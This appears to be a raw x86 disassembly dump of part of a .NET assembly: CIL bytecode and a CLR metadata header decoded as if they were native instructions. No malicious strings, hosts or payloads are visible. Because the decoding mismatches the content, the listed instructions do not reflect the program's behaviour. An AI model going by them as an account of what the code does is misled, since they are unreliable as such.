  405746:	00 00                	add    %al,(%eax)
  405748:	0a 07                	or     (%edi),%al
  40574a:	28 4a 00             	sub    %cl,0x0(%edx)
  40574d:	00 0a                	add    %cl,(%edx)
  40574f:	28 58 00             	sub    %bl,0x0(%eax)
  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	0c 27                	or     $0x27,%al
  405a26:	00 00                	add    %al,(%eax)
  405a28:	23 53 74             	and    0x74(%ebx),%edx
  405a2b:	72 69                	jb     0x405a96
  405a2d:	6e                   	outsb  %ds:(%esi),(%dx)
  405a2e:	67 73 00             	addr16 jae 0x405a31
  405a31:	00 00                	add    %al,(%eax)
  405a33:	00 34 45 00 00 34 28 	add    %dh,0x28340000(,%eax,2)
  405a3a:	00 00                	add    %al,(%eax)
  405a3c:	23 55 53             	and    0x53(%ebp),%edx
  405a3f:	00 68 6d             	add    %ch,0x6d(%eax)
  405a42:	00 00                	add    %al,(%eax)
  405a44:	10 00                	adc    %al,(%eax)
  405a46:	00 00                	add    %al,(%eax)
  405a48:	23 47 55             	and    0x55(%edi),%eax
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 78 6d             	add    %bh,0x6d(%eax)
  405a52:	00 00                	add    %al,(%eax)
  405a54:	40                   	inc    %eax
  405a55:	09 00                	or     %eax,(%eax)
  405a57:	00 23                	add    %ah,(%ebx)
  405a59:	42                   	inc    %edx
  405a5a:	6c                   	insb   (%dx),%es:(%edi)
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	e0 23                	loopne 0x405aff
  405adc:	01 00                	add    %eax,(%eax)
  405ade:	00 00                	add    %al,(%eax)
  405ae0:	00 00                	add    %al,(%eax)
  405ae2:	06                   	push   %es
  405ae3:	00 5a 21             	add    %bl,0x21(%edx)
  405ae6:	36 18 0a             	sbb    %cl,%ss:(%edx)
  405ae9:	00 4c 00 51          	add    %cl,0x51(%eax,%eax,1)
  405aed:	1f                   	pop    %ds
  405aee:	0a 00                	or     (%eax),%al
  405af0:	87 21                	xchg   %esp,(%ecx)
  405af2:	d0 20                	shlb   $1,(%eax)
  405af4:	0a 00                	or     (%eax),%al
  405af6:	ea 17 3b 26 06 00 3d 	ljmp   $0x3d00,$0x6263b17
  405afd:	1d 6b 13 06 00       	sbb    $0x6136b,%eax
  405b02:	c4 0f                	les    (%edi),%ecx
  405b04:	51                   	push   %ecx
  405b05:	1f                   	pop    %ds
  405b06:	0a 00                	or     (%eax),%al
  405b08:	fd                   	std
  405b09:	18 51 1f             	sbb    %dl,0x1f(%ecx)
  405b0c:	0a 00                	or     (%eax),%al
  405b0e:	99                   	cltd
  405b0f:	20 3b                	and    %bh,(%ebx)
  405b11:	26 06                	es push %es
  405b13:	00 d4                	add    %dl,%ah
  405b15:	21 36                	and    %esi,(%esi)
  405b17:	18 0e                	sbb    %cl,(%esi)
  405b19:	00 8d 1a a7 13 0e    	add    %cl,0xe13a71a(%ebp)
  405b1f:	00 28                	add    %ch,(%eax)
  405b21:	21 a7 13 06 00 c1    	and    %esp,-0x3efff9ed(%edi)
  405b27:	24 6b                	and    $0x6b,%al
  405b29:	13 06                	adc    (%esi),%eax
  405b2b:	00 9c 1c 4d 23 06 00 	add    %bl,0x6234d(%esp,%ebx,1)
  405b32:	a9 18 36 18 0a       	test   $0xa183618,%eax
  405b37:	00 da                	add    %bl,%dl
  405b39:	1f                   	pop    %ds
  405b3a:	2b 00                	sub    (%eax),%eax
  405b3c:	06                   	push   %es
  405b3d:	00 24 00             	add    %ah,(%eax,%eax,1)
  405b40:	87 0a                	xchg   %ecx,(%edx)
  405b42:	12 00                	adc    (%eax),%al
  405b44:	19 00                	sbb    %eax,(%eax)
  405b46:	e9 1e 12 00 01       	jmp    0x1406d69
  405b4b:	00 36                	add    %dh,(%esi)
  405b4d:	18 12                	sbb    %dl,(%edx)
  405b4f:	00 fa                	add    %bh,%dl
  405b51:	0f e9 1e             	psubsw (%esi),%mm3
  405b54:	06                   	push   %es
  405b55:	00 49 0f             	add    %cl,0xf(%ecx)
  405b58:	36 18 06             	sbb    %al,%ss:(%esi)
  405b5b:	00 9a 13 4d 23 06    	add    %bl,0x6234d13(%edx)
  405b61:	00 a6 1d 53 20 06    	add    %ah,0x620531d(%esi)
  405b67:	00 7e 0d             	add    %bh,0xd(%esi)
  405b6a:	53                   	push   %ebx
  405b6b:	20 06                	and    %al,(%esi)
  405b6d:	00 12                	add    %dl,(%edx)
  405b6f:	18 5b 05             	sbb    %bl,0x5(%ebx)
  405b72:	06                   	push   %es
  405b73:	00 07                	add    %al,(%edi)
  405b75:	11 e9                	adc    %ebp,%ecx
  405b77:	1e                   	push   %ds
  405b78:	06                   	push   %es
  405b79:	00 74 11 e9          	add    %dh,-0x17(%ecx,%edx,1)
  405b7d:	1e                   	push   %ds
  405b7e:	06                   	push   %es
  405b7f:	00 24 10             	add    %ah,(%eax,%edx,1)
  405b82:	99                   	cltd
  405b83:	1e                   	push   %ds
  405b84:	6f                   	outsl  %ds:(%esi),(%dx)
  405b85:	00 09                	add    %cl,(%ecx)
  405b87:	1f                   	pop    %ds
  405b88:	00 00                	add    %al,(%eax)
  405b8a:	06                   	push   %es
  405b8b:	00 4c 10 c0          	add    %cl,-0x40(%eax,%edx,1)
  405b8f:	19 06                	sbb    %eax,(%esi)
  405b91:	00 d3                	add    %dl,%bl
  405b93:	10 c0                	adc    %al,%al
  405b95:	19 06                	sbb    %eax,(%esi)
  405b97:	00 b4 10 c0 19 06 00 	add    %dh,0x619c0(%eax,%edx,1)
  405b9e:	5b                   	pop    %ebx
  405b9f:	11 c0                	adc    %eax,%eax
  405ba1:	19 06                	sbb    %eax,(%esi)
  405ba3:	00 27                	add    %ah,(%edi)
  405ba5:	11 c0                	adc    %eax,%eax
  405ba7:	19 06                	sbb    %eax,(%esi)
  405ba9:	00 40 11             	add    %al,0x11(%eax)
  405bac:	c0 19 06             	rcrb   $0x6,(%ecx)
  405baf:	00 63 10             	add    %ah,0x10(%ebx)
  405bb2:	c0 19 06             	rcrb   $0x6,(%ecx)
  405bb5:	00 97 10 c0 19 06    	add    %dl,0x619c010(%edi)
  405bbb:	00 7e 10             	add    %bh,0x10(%esi)
  405bbe:	be 13 06 00 38       	mov    $0x38000613,%esi
  405bc3:	10 ca                	adc    %cl,%dl
  405bc5:	1e                   	push   %ds
  405bc6:	06                   	push   %es
  405bc7:	00 09                	add    %cl,(%ecx)
  405bc9:	10 e9                	adc    %ch,%cl
  405bcb:	1e                   	push   %ds
  405bcc:	06                   	push   %es
  405bcd:	00 f0                	add    %dh,%al
  405bcf:	10 c0                	adc    %al,%al
  405bd1:	19 06                	sbb    %eax,(%esi)
  405bd3:	00 f1                	add    %dh,%cl
  405bd5:	0a 6b 13             	or     0x13(%ebx),%ch
  405bd8:	06                   	push   %es
  405bd9:	00 0d 23 36 18 06    	add    %cl,0x6183623
  405bdf:	00 5b 22             	add    %bl,0x22(%ebx)
  405be2:	36 18 06             	sbb    %al,%ss:(%esi)
  405be5:	00 9e 13 4d 23 0a    	add    %bl,0xa234d13(%esi)
  405beb:	00 70 25             	add    %dh,0x25(%eax)
  405bee:	51                   	push   %ecx
  405bef:	1f                   	pop    %ds
  405bf0:	06                   	push   %es
  405bf1:	00 5f 18             	add    %bl,0x18(%edi)
  405bf4:	86 25 06 00 6a 1c    	xchg   %ah,0x1c6a0006
  405bfa:	86 25 06 00 33 13    	xchg   %ah,0x13330006
  405c00:	86 25 06 00 49 1a    	xchg   %ah,0x1a490006
  405c06:	36 18 0a             	sbb    %cl,%ss:(%edx)
  405c09:	00 c6                	add    %al,%dh
  405c0b:	20 75 21             	and    %dh,0x21(%ebp)
  405c0e:	0a 00                	or     (%eax),%al
  405c10:	f2 21 75 21          	repnz and %esi,0x21(%ebp)
  405c14:	0a 00                	or     (%eax),%al
  405c16:	3a 17                	cmp    (%edi),%dl
  405c18:	75 21                	jne    0x405c3b
  405c1a:	0a 00                	or     (%eax),%al
  405c1c:	ac                   	lods   %ds:(%esi),%al
  405c1d:	25 d0 20 0a 00       	and    $0xa20d0,%eax
  405c22:	68 0f d0 20 0a       	push   $0xa20d00f
  405c27:	00 53 0f             	add    %dl,0xf(%ebx)
  405c2a:	d0 20                	shlb   $1,(%eax)
  405c2c:	06                   	push   %es
  405c2d:	00 2d 14 36 18 06    	add    %ch,0x6183614
  405c33:	00 3f                	add    %bh,(%edi)
  405c35:	1c 36                	sbb    $0x36,%al
  405c37:	18 06                	sbb    %al,(%esi)
  405c39:	00 91 18 36 18 0a    	add    %dl,0xa183618(%ecx)
  405c3f:	00 46 20             	add    %al,0x20(%esi)
  405c42:	75 21                	jne    0x405c65
  405c44:	0a 00                	or     (%eax),%al
  405c46:	f1                   	int1
  405c47:	1f                   	pop    %ds
  405c48:	75 21                	jne    0x405c6b
  405c4a:	06                   	push   %es
  405c4b:	00 66 20             	add    %ah,0x20(%esi)
  405c4e:	36 18 06             	sbb    %al,%ss:(%esi)
  405c51:	00 8a 0d 36 18 0a    	add    %cl,0xa18360d(%edx)
  405c57:	00 dc                	add    %bl,%ah
  405c59:	17                   	pop    %ss
  405c5a:	d0 20                	shlb   $1,(%eax)
  405c5c:	0a 00                	or     (%eax),%al
  405c5e:	9f                   	lahf
  405c5f:	16                   	push   %ss
  405c60:	3b 26                	cmp    (%esi),%esp
  405c62:	0a 00                	or     (%eax),%al
  405c64:	c2 22 75             	ret    $0x7522
  405c67:	21 0a                	and    %ecx,(%edx)
  405c69:	00 d2                	add    %dl,%dl
  405c6b:	19 51 1f             	sbb    %edx,0x1f(%ecx)
  405c6e:	0a 00                	or     (%eax),%al
  405c70:	15 20 a1 19 06       	adc    $0x619a120,%eax
  405c75:	00 b4 11 36 18 06 00 	add    %dh,0x61836(%ecx,%edx,1)
  405c7c:	c3                   	ret
  405c7d:	16                   	push   %ss
  405c7e:	6b 13 06             	imul   $0x6,(%ebx),%edx
  405c81:	00 91 16 36 18 0a    	add    %dl,0xa183616(%ecx)
  405c87:	00 ca                	add    %cl,%dl
  405c89:	15 36 18 0a 00       	adc    $0xa1836,%eax
  405c8e:	35 0f 36 18 06       	xor    $0x618360f,%eax
  405c93:	00 75 1d             	add    %dh,0x1d(%ebp)
  405c96:	36 18 06             	sbb    %al,%ss:(%esi)
  405c99:	00 f4                	add    %dh,%ah
  405c9b:	22 6b 13             	and    0x13(%ebx),%ch
  405c9e:	06                   	push   %es
  405c9f:	00 0c 18             	add    %cl,(%eax,%ebx,1)
  405ca2:	5b                   	pop    %ebx
  405ca3:	05 06 00 11 1e       	add    $0x1e110006,%eax
  405ca8:	6b 13 0a             	imul   $0xa,(%ebx),%edx
  405cab:	00 26                	add    %ah,(%esi)
  405cad:	0d d0 20 06 00       	or     $0x620d0,%eax
  405cb2:	e5 00                	in     $0x0,%eax
  405cb4:	36 18 06             	sbb    %al,%ss:(%esi)
  405cb7:	00 9c 1a 5b 05 0a 00 	add    %bl,0xa055b(%edx,%ebx,1)
  405cbe:	be 20 99 1e 0a       	mov    $0xa1e9920,%esi
  405cc3:	00 de                	add    %bl,%dh
  405cc5:	1a 99 1e 06 00 7a    	sbb    0x7a00061e(%ecx),%bl
